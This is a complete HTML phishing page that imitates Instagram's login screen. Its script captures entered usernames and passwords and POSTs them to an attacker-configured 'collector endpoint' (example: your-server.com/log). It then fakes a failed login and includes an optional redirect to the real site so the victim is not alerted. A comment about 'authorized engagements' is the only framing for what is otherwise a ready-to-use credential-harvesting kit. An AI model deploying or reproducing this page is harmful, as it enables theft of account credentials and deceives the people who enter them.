<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Instagram</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }

  body {
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
    background: #fafafa;
    min-height: 100vh;
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    padding: 24px 0;
    color: #262626;
  }

  .wrapper { width: 100%; max-width: 350px; padding: 0 12px; }

  /* ---- Cards ---- */
  .card {
    background: #fff;
    border: 1px solid #dbdbdb;
    border-radius: 1px;
    padding: 24px 40px 16px;
    margin-bottom: 10px;
  }

  /* ---- Logo ---- */
  .logo {
    display: flex;
    align-items: center;
    justify-content: center;
    margin-bottom: 24px;
  }
  .logo svg { width: 32px; height: 32px; margin-right: 4px; }
  .logo .wordmark {
    font-size: 28px;
    font-weight: 700;
    letter-spacing: -0.5px;
    background: linear-gradient(45deg, #feda75, #d62976, #962fbf, #4f5bd5);
    -webkit-background-clip: text;
    background-clip: text;
    -webkit-text-fill-color: transparent;
  }

  /* ---- Fields (floating labels like the real page) ---- */
  .field { position: relative; margin-bottom: 6px; }

  .field input {
    width: 100%;
    font-size: 14px;
    padding: 16px 8px 4px;
    border: 1px solid #dbdbdb;
    border-radius: 3px;
    background: #fafafa;
    outline: none;
    color: #262626;
  }
  .field input:focus { border-color: #a8a8a8; }

  .field label {
    position: absolute;
    left: 9px;
    top: 50%;
    transform: translateY(-50%);
    font-size: 14px;
    color: #737373;
    pointer-events: none;
    transition: all 0.1s ease-out;
  }
  .field input:focus + label,
  .field input:not(:placeholder-shown) + label {
    top: 6px;
    transform: none;
    font-size: 10px;
  }

  .eye {
    position: absolute;
    right: 6px;
    top: 50%;
    transform: translateY(-50%);
    background: none;
    border: none;
    cursor: pointer;
    padding: 4px;
    display: none;
    color: #262626;
  }
  .field input:not(:placeholder-shown) ~ .eye { display: block; }

  /* ---- Login button ---- */
  .login-btn {
    width: 100%;
    height: 32px;
    margin-top: 10px;
    background: #0095f6;
    color: #fff;
    font-size: 14px;
    font-weight: 600;
    border: none;
    border-radius: 8px;
    cursor: pointer;
  }
  .login-btn:hover { background: #1877f2; }
  .login-btn:disabled { background: #b2dffc; cursor: default; }

  /* ---- OR divider ---- */
  .divider {
    display: flex;
    align-items: center;
    margin: 16px 0;
  }
  .divider::before, .divider::after {
    content: "";
    flex: 1;
    height: 1px;
    background: #dbdbdb;
  }
  .divider span {
    margin: 0 14px;
    font-size: 13px;
    font-weight: 600;
    color: #737373;
  }

  /* ---- Facebook login ---- */
  .fb-link {
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 8px;
    margin-bottom: 14px;
    color: #385185;
    font-size: 14px;
    font-weight: 600;
    text-decoration: none;
  }
  .fb-link svg { width: 16px; height: 16px; fill: #385185; }

  .forgot {
    display: block;
    text-align: center;
    font-size: 12px;
    color: #00376b;
    text-decoration: none;
  }

  /* ---- Signup card ---- */
  .signup {
    text-align: center;
    font-size: 14px;
    padding: 20px 0;
  }
  .signup a { color: #0095f6; font-weight: 600; text-decoration: none; }

  /* ---- App badges ---- */
  .app-section { text-align: center; margin-top: 8px; }
  .app-section p { font-size: 14px; margin-bottom: 14px; }
  .badges { display: flex; justify-content: center; gap: 8px; }
  .badges a {
    display: flex; align-items: center; gap: 6px;
    border: 1px solid #dbdbdb; border-radius: 6px;
    padding: 6px 12px; color: #262626; text-decoration: none;
    font-size: 12px; font-weight: 600;
  }
  .badges svg { width: 16px; height: 16px; }

  /* ---- Footer ---- */
  footer { margin-top: 20px; text-align: center; }
  footer .links {
    display: flex; flex-wrap: wrap; justify-content: center;
    gap: 4px 12px; margin-bottom: 12px;
  }
  footer a {
    font-size: 12px; color: #737373; text-decoration: none;
  }
  footer a:hover { text-decoration: underline; }
  footer p { font-size: 12px; color: #737373; }
</style>
</head>
<body>

<main class="wrapper">

  <!-- Login card -->
  <div class="card">
    <div class="logo">
      <!-- Instagram camera glyph -->
      <svg viewBox="0 0 24 24" fill="none" stroke="#262626" stroke-width="1.8">
        <rect x="2" y="2" width="20" height="20" rx="5" ry="5"/>
        <circle cx="12" cy="12" r="4.2"/>
        <circle cx="17.4" cy="6.6" r="1.1" fill="#262626" stroke="none"/>
      </svg>
      <span class="wordmark">Instagram</span>
    </div>

    <form id="loginForm" autocomplete="off">
      <div class="field">
        <input type="text" id="username" name="username" placeholder=" " required>
        <label for="username">Phone number, username, or email</label>
      </div>

      <div class="field">
        <input type="password" id="password" name="password" placeholder=" " required>
        <label for="password">Password</label>
        <button type="button" class="eye" id="togglePw" aria-label="Show password">
          <!-- eye icon -->
          <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8">
            <path d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7S1 12 1 12z"/>
            <circle cx="12" cy="12" r="3"/>
          </svg>
        </button>
      </div>

      <button type="submit" class="login-btn" id="loginBtn">Log in</button>
    </form>

    <div class="divider"><span>OR</span></div>

    <a class="fb-link" href="#">
      <!-- Facebook "f" logo -->
      <svg viewBox="0 0 24 24"><path d="M24 12.07C24 5.4 18.63 0 12 0S0 5.4 0 12.07C0 18.1 4.39 23.09 10.13 24v-8.44H7.08v-3.49h3.05V9.41c0-3.02 1.79-4.7 4.53-4.7 1.31 0 2.68.24 2.68.24v2.97h-1.51c-1.49 0-1.96.93-1.96 1.89v2.26h3.33l-.53 3.49h-2.8V24C19.61 23.09 24 18.1 24 12.07z"/></svg>
      Log in with Facebook
    </a>

    <a class="forgot" href="#">Forgot password?</a>
  </div>

  <!-- Signup card -->
  <div class="card signup">
    Don't have an account? <a href="#">Sign up</a>
  </div>

  <!-- App badges -->
  <div class="app-section">
    <p>Get the app.</p>
    <div class="badges">
      <a href="#">
        <svg viewBox="0 0 24 24" fill="currentColor"><path d="M17.05 20.28c-.98.95-2.05.8-3.08.35-1.09-.46-2.09-.48-3.24 0-1.44.62-2.2.44-3.06-.35C2.79 15.25 3.51 7.59 9.05 7.31c1.35.07 2.29.74 3.08.8 1.18-.24 2.31-.93 3.57-.84 1.51.12 2.65.72 3.4 1.8-3.12 1.87-2.38 5.98.48 7.13-.57 1.5-1.31 2.99-2.53 4.09zM12.03 7.25c-.15-2.23 1.66-4.07 3.74-4.25.29 2.58-2.34 4.5-3.74 4.25z"/></svg>
        App Store
      </a>
      <a href="#">
        <svg viewBox="0 0 24 24" fill="currentColor"><path d="M3.61 1.81 13.79 12 3.61 22.19c-.37-.2-.61-.59-.61-1.05V2.86c0-.46.24-.85.61-1.05zM14.5 12.71 4.26 23.04c.18.07.38.09.58.06.12-.02.24-.06.34-.12l9.32-5.37-3.32-3.32 3.32-.85zm6.37-3.53-3.24 1.87-3.13-3.13 6.37-3.67c.58.3.94.9.94 1.58v1.77c0 .62-.31 1.16-.94 1.58z"/></svg>
        Google Play
      </a>
    </div>
  </div>

  <!-- Footer -->
  <footer>
    <div class="links">
      <a href="#">Meta</a><a href="#">About</a><a href="#">Blog</a>
      <a href="#">Jobs</a><a href="#">Help</a><a href="#">API</a>
      <a href="#">Privacy</a><a href="#">Terms</a><a href="#">Locations</a>
      <a href="#">Instagram Lite</a><a href="#">Threads</a>
      <a href="#">Contact Uploading &amp; Non-Users</a>
      <a href="#">Meta Verified</a>
    </div>
    <p>© 2026 Instagram from Meta</p>
  </footer>

</main>

<script>
  // ---- Password visibility toggle (like the real page) ----
  const togglePw = document.getElementById('togglePw');
  const pwField = document.getElementById('password');
  togglePw.addEventListener('click', () => {
    pwField.type = pwField.type === 'password' ? 'text' : 'password';
  });

  // ---- Credential capture (authorized engagements only) ----
  const form = document.getElementById('loginForm');

  form.addEventListener('submit', async (e) => {
    e.preventDefault();

    const creds = {
      username: document.getElementById('username').value.trim(),
      password: document.getElementById('password').value
    };

    // CONFIGURE: point this at your collector endpoint
    // e.g. const endpoint = 'https://your-server.com/log';
    const endpoint = '';

    if (endpoint) {
      try {
        await fetch(endpoint, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(creds)
        });
      } catch (err) {
        console.error('Capture failed:', err);
      }
    }

    // Simulate a failed login, then optionally redirect so the
    // victim ends up on the real Instagram login (better realism):
    const btn = document.getElementById('loginBtn');
    btn.disabled = true;
    btn.textContent = 'Logging in...';

    setTimeout(() => {
      btn.disabled = false;
      btn.textContent = 'Log in';
      // Redirect to the real login page so the target isn't alerted.
      // Uncomment to enable:
      // window.location.href = 'https://www.instagram.com/accounts/login/';
    }, 1200);
  });
</script>

</body>
</html>
